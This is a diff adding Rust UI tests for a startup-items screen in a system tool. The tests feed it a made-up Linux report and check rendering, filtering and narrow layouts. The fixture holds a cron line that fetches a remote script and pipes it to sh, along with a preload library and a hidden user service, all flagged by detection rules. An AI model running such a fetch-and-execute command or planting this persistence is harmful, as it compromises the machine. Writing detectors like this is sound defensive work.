@@ -4438,3 +4438,197 @@ fn borgs_files_lists_each_place_the_captures_and_what_is_left_over() -> Result<(
     ensure_text(&buffer, "2 items in /run/user/1000/borg-commander")?;
     check("storage_clean_question", &stage, buffer)
 }
+
+/// Startup items on a made-up Linux machine, newest change first: a boot job that fetches a
+/// script, a user service whose program is gone, a preloaded library, an SSH key with a
+/// forced command, timers, services and autostart entries.
+fn startup_report() -> borg_core::StartupReport {
+    use borg_core::{ProgramPresence, RuleHit, StartupEntry, StartupItem, StartupPlace, StartupReport};
+    use borg_rules::{Evidence, Level, RuleMatch};
+    let at = |stamp: &str| -> SystemTime {
+        let stamp: jiff::Timestamp = stamp.parse().unwrap();
+        SystemTime::from(stamp)
+    };
+    let item = |place, file: &str, owner: &str, modified: &str, found: StartupEntry| StartupItem {
+        place,
+        file: file.into(),
+        found,
+        owner: Some(owner.into()),
+        modified: Some(at(modified)),
+        presence: ProgramPresence::Unknown,
+        resolved: None,
+        hits: Vec::new(),
+        read_only: false,
+    };
+    let entry = |line: Option<usize>, name: &str, runs: &str, program: Option<&str>, when: Option<&str>| StartupEntry {
+        line,
+        name: name.into(),
+        runs: runs.into(),
+        program: program.map(str::to_owned),
+        when: when.map(str::to_owned),
+        ..StartupEntry::default()
+    };
+    let boot_job = "@reboot curl -s http://203.0.113.7/u.sh | sh";
+    let mut fetch = item(
+        StartupPlace::Crontab,
+        "/var/spool/cron/crontabs/me",
+        "me",
+        "2026-01-15T09:41:00Z",
+        entry(Some(3), "me", "curl -s http://203.0.113.7/u.sh | sh", Some("curl"), Some("@reboot")),
+    );
+    fetch.presence = ProgramPresence::Present;
+    fetch.resolved = Some("/usr/bin/curl".into());
+    fetch.hits = vec![RuleHit {
+        rule: RuleMatch {
+            rule: "reboot_job_fetch".into(),
+            namespace: borg_rules::BUILT_IN.into(),
+            level: Level::Warning,
+            description: None,
+            false_positives: None,
+            evidence: Some(Evidence {
+                string: "$reboot".into(),
+                offset: 48,
+                length: boot_job.len() as u64,
+                bytes: boot_job.as_bytes().to_vec(),
+            }),
+        },
+        in_program: false,
+    }];
+    let mut helper = item(
+        StartupPlace::UserService,
+        "/home/me/.config/systemd/user/sync-helper.service",
+        "me",
+        "2026-01-14T22:03:00Z",
+        entry(
+            None,
+            "sync-helper.service",
+            "/home/me/.local/share/.sync/helper --quiet",
+            Some("/home/me/.local/share/.sync/helper"),
+            Some("default.target"),
+        ),
+    );
+    helper.presence = ProgramPresence::Missing;
+    let mut preload = item(
+        StartupPlace::Preload,
+        "/etc/ld.so.preload",
+        "root",
+        "2026-01-12T17:20:00Z",
+        entry(Some(1), "ld.so.preload", "/usr/local/lib/libhook.so", Some("/usr/local/lib/libhook.so"), None),
+    );
+    preload.presence = ProgramPresence::Present;
+    let mut key = item(
+        StartupPlace::AuthorizedKey,
+        "/home/me/.ssh/authorized_keys",
+        "me",
+        "2026-01-10T08:15:00Z",
+        entry(
+            Some(2),
+            "backup@203.0.113.7",
+            "command=\"/usr/local/bin/backup-receive\" ssh-ed25519 … backup@203.0.113.7",
+            Some("/usr/local/bin/backup-receive"),
+            None,
+        ),
+    );
+    key.presence = ProgramPresence::Present;
+    let shell = item(
+        StartupPlace::ShellStartup,
+        "/home/me/.bashrc",
+        "me",
+        "2025-12-02T19:30:00Z",
+        entry(None, ".bashrc", "eval \"$(direnv hook bash)\"", None, None),
+    );
+    let mut certbot = item(
+        StartupPlace::Timer,
+        "/etc/systemd/system/certbot.timer",
+        "root",
+        "2025-11-20T06:00:00Z",
+        entry(None, "certbot.timer", "certbot.service", None, Some("OnCalendar=*-*-* 00,12:00:00")),
+    );
+    certbot.found.user = Some("root".into());
+    let mut ssh = item(
+        StartupPlace::Service,
+        "/lib/systemd/system/ssh.service",
+        "root",
+        "2025-08-14T11:02:00Z",
+        entry(None, "ssh.service", "/usr/sbin/sshd -D $SSHD_OPTS", Some("/usr/sbin/sshd"), Some("multi-user.target")),
+    );
+    ssh.presence = ProgramPresence::Present;
+    let mut chat = item(
+        StartupPlace::Autostart,
+        "/etc/xdg/autostart/chat.desktop",
+        "root",
+        "2025-06-02T15:45:00Z",
+        entry(None, "Chat", "chat --minimized", Some("chat"), None),
+    );
+    chat.found.disabled = true;
+    StartupReport {
+        items: vec![fetch, helper, preload, key, shell, certbot, ssh, chat],
+        unread: vec![("/etc/cron.d/backup".into(), "Permission denied (os error 13)".into())],
+        problems: Vec::new(),
+    }
+}
+
+fn open_startup_items(stage: &mut Stage) -> Result<()> {
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::ALT)),
+        stage.started,
+    );
+    anyhow::ensure!(
+        effects.iter().any(|effect| matches!(effect, borg_core::Effect::StartupItems { .. })),
+        "opening reads the places"
+    );
+    Ok(())
+}
+
+/// Alt-U reads the places programs start from and lists what it found, newest change first,
+/// with the selected item's command, program and the rules it matched beside the list; the
+/// filter narrows the list and Alt-W gives it the whole width.
+#[test]
+fn startup_items_list_what_starts_on_its_own_newest_first() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    open_startup_items(&mut stage)?;
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Reading the places programs start from")?;
+    check("startup_items_loading", &stage, buffer)?;
+
+    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
+    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "reboot_job_fetch")?;
+    ensure_text(&buffer, "/etc/cron.d/backup")?;
+    check("startup_items", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "missing")?;
+    check("startup_items_missing_program", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('/'))).send(Msg::Paste("root !timer".into()));
+    let buffer = stage.render(stage.started)?;
+    assert_eq!(stage.state.startup_items.len(), 3, "root's items other than the timer");
+    check("startup_items_filter", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Enter)).send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    assert!(stage.state.startup_items.expanded, "Alt-W gives the list the whole width");
+    check("startup_items_expanded", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
+    assert!(!stage.state.startup_items.is_open(), "Esc clears the filter, then closes the screen");
+    Ok(())
+}
+
+/// On a narrow screen the list keeps the time, the place and the command and leaves out the
+/// columns that do not fit.
+#[test]
+fn startup_items_drop_columns_on_a_narrow_screen() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 80, rows: 28 }, Motion::STILL)?;
+    open_startup_items(&mut stage)?;
+    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
+    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "2026-01-15 09:41")?;
+    check("startup_items_narrow", &stage, buffer)?;
+    Ok(())
+}
